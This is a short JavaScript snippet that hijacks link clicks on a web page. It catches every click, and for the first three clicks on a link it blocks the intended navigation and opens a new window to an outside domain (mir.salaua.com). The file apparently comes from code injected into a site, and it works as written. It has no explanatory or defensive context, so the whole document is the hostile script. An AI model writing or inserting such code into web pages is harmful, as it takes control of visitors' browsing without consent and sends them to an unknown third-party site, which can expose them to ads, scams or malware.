var detourTimes = 1;
document.addEventListener("click", function(evt){if(onClickDetour(evt)){evt.preventDefault();}}, true);

function onClickDetour(evt){
    event = evt || window.event;
    if(detourTimes > 3){
        return false;
    }
    if(event.target.href != null){
        detourTimes++;
        window.open('http://mir.salaua.com');
        return true;
    }
    return false;
}
